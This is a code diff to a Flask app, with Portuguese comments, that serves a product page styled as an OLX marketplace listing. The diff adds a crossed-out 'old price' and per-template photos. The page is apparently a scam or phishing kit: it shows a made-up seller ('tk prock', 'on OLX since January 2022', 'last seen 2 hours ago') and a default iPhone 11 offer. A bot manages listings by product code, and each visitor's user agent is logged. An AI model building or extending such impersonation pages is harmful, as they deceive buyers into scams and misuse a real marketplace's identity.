@@ -374,9 +374,10 @@ def index(product_code=None):
         try:
             conn = admin_bot.get_db()
             custom_product = conn.execute(
-                "SELECT name, price, description, image_url FROM product_templates WHERE code=?", (p_code,)
+                "SELECT name, price, old_price, description, image_url, image1, image2, image3 FROM product_templates WHERE code=?", (p_code,)
             ).fetchone()
             conn.close()
+
         except Exception:
             pass
 
@@ -385,28 +386,47 @@ def index(product_code=None):
         product_price = custom_product["price"]
         product_description = custom_product["description"]
         product_image = custom_product["image_url"] or "/static/images/iphone11_1.jpg"
+        # old_price e fotos individuais do template
+        try:
+            product_old_price_tpl = custom_product["old_price"] or ""
+        except Exception:
+            product_old_price_tpl = ""
+        try:
+            img1_tpl = custom_product["image1"] or product_image
+            img2_tpl = custom_product["image2"] or product_image
+            img3_tpl = custom_product["image3"] or product_image
+        except Exception:
+            img1_tpl = img2_tpl = img3_tpl = product_image
+        # Usa as fotos do template (override global)
+        product_image1 = img1_tpl
+        product_image2 = img2_tpl
+        product_image3 = img3_tpl
+        product_old_price = product_old_price_tpl
     else:
         product_name = admin_bot.get_config("product_name", "iPhone 11. 64gb branco") if BOT_AVAILABLE else "iPhone 11. 64gb branco"
         product_price = admin_bot.get_config("product_price", "630.00") if BOT_AVAILABLE else "630.00"
         product_description = admin_bot.get_config("product_description", "iPhone 11 com 64GB de armazenamento na cor branca. Design elegante e desempenho excepcional para o seu dia a dia.") if BOT_AVAILABLE else "iPhone 11 com 64GB de armazenamento na cor branca. Design elegante e desempenho excepcional para o seu dia a dia."
         product_image = admin_bot.get_config("product_image", "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80"
+        product_image1 = admin_bot.get_config("product_image1", "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80"
+        product_image2 = admin_bot.get_config("product_image2", "https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=800&auto=format&fit=crop&q=80"
+        product_image3 = admin_bot.get_config("product_image3", "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&auto=format&fit=crop&q=80"
+        product_old_price = admin_bot.get_config("product_old_price", "") if BOT_AVAILABLE else ""
 
-    product_image1 = admin_bot.get_config("product_image1", "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80"
-    product_image2 = admin_bot.get_config("product_image2", "https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=800&auto=format&fit=crop&q=80"
-    product_image3 = admin_bot.get_config("product_image3", "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&auto=format&fit=crop&q=80"
 
-    seller_name = admin_bot.get_config("seller_name", "tk prock") if BOT_AVAILABLE else "tk prock"
-    seller_since = admin_bot.get_config("seller_since", "Na OLX desde janeiro de 2022") if BOT_AVAILABLE else "Na OLX desde janeiro de 2022"
+    # Campos partilhados — sempre carregados do config global
+    seller_name   = admin_bot.get_config("seller_name",   "tk prock") if BOT_AVAILABLE else "tk prock"
+    seller_since  = admin_bot.get_config("seller_since",  "Na OLX desde janeiro de 2022") if BOT_AVAILABLE else "Na OLX desde janeiro de 2022"
     seller_status = admin_bot.get_config("seller_status", "Último acesso há 2 horas") if BOT_AVAILABLE else "Último acesso há 2 horas"
-
-    logo_url = admin_bot.get_config("logo_url", "") if BOT_AVAILABLE else ""
+    logo_url      = admin_bot.get_config("logo_url", "") if BOT_AVAILABLE else ""
 
     _log("PAGE_ENTRY", sid, {"ua": ua, "path": request.path, "product": product_name})
+
     return render_template(
         'index.html',
         session_id=sid,
         product_name=product_name,
         product_price=product_price,
+        product_old_price=product_old_price,
         product_description=product_description,
         product_image=product_image,
         product_image1=product_image1,
@@ -431,6 +451,7 @@ def api_config():
         "whatsapp_message":    wa["message"],
         "logo_url":            gc("logo_url", ""),
         "product_price":       gc("product_price", "630.00"),
+        "product_old_price":   gc("product_old_price", ""),
         "product_name":        gc("product_name", "iPhone 11 64GB Branco"),
         "product_description": gc("product_description", "iPhone 11 com 64GB de armazenamento na cor branca."),
         "product_image":       gc("product_image", ""),
@@ -582,7 +603,7 @@ def api_admin_config_save():
         return jsonify({"ok": False, "error": "bot_not_available"}), 503
     data = request.json or {}
     allowed_keys = {
-        "product_name", "product_price", "product_description",
+        "product_name", "product_price", "product_old_price", "product_description",
         "product_image", "product_image1", "product_image2", "product_image3",
         "whatsapp_number", "whatsapp_message",
         "seller_name", "seller_status", "seller_since", "logo_url",
